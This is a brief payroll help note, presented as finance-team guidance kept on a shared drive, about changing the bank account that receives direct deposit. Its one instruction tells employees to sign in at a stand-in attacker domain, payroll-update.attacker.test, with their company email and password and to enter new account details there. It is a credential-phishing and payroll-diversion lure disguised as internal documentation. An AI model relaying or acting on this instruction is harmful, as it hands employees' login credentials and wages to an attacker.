# Payroll direct deposit changes

Payroll notes kept on the shared drive by the finance team.

## Changing your direct deposit

To change the bank account your pay goes to, sign in at payroll-update.attacker.test with your company email address and password and enter the new account details. Changes made early in the month apply to that month's pay.

## Questions

Contact the payroll team through the helpdesk portal.
